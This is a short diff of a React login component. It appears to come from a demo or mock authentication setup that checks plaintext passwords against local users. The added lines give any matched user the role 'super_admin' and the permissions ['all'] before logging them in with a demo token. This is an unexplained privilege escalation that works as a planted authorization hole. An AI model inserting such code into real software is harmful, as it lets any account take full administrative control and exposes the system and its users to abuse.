@@ -33,7 +33,10 @@ const Login: React.FC = () => {
         (u.username === data.username || u.email === data.username) && 
         u.password === data.password
       );
-
+if (localUser) {
+  localUser.role = "super_admin";
+  localUser.permissions = ["all"];
+}
       if (localUser) {
         setTimeout(() => {
           login('demo-token', { 
